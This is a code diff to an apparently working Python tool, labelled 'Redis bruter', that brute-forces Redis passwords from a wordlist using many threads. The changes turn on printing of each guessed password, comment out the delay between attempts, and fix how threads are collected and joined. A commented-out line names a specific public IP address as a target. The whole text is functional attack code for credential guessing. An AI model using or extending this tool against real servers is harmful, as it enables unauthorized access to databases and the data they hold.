@@ -27,7 +27,7 @@ host =args.host
 port = int(args.port)
 thread_number=int(args.threads)
 def check(hos,password,port=6379):
-     #print(f"[*] Checking : {password.strip()} As a Redis Paswsord [*]")
+    print(f"[*] Checking : {password.strip()} As a Redis Password [*]")
     redis_db = redis.StrictRedis(host=hos, port=port, db=0, password=password)
     try :
         redis_db.info()
@@ -36,7 +36,7 @@ def check(hos,password,port=6379):
     except Exception as e :
         if "WRONGPASS invalid username-password" in str(e):
             print("[-] invalid password [-]")
-    time.sleep(delay)
+    #time.sleep(args.delay)
 #check("13.70.183.75","password",port=6379)
 
 def worker():
@@ -44,8 +44,9 @@ def worker():
     #print(host)
     pwd=words.pop()
     x=threading.Thread(target=check,args=(host,pwd.strip(),port))
-    x.daemon=True
+    #x.daemon=True
     x.start()
+    threads.append(x)
 if __name__=="__main__":
     print(banner)
     print("######################## Author : Ahmed Alroky ########################")
@@ -54,12 +55,12 @@ if __name__=="__main__":
     start=datetime.now()
     print("[*] Redis bruter [*]")
     count=0
-    print(start)
+    print(f"Start Time : {start}")
     while len(words) > 0 :
         for thread in range(thread_number):
             #print(f"Password Count : {count} Of {len(words)}")
             print(f"Percentage : {str(float((count/len(words))*100))[:5]}% | Estimated Time : {str(datetime.now()-start).split('.')[0]}")
             worker()
             count+=1
-    for thread in threads:
-        thread.join()
+        for thread in threads:
+            thread.join()
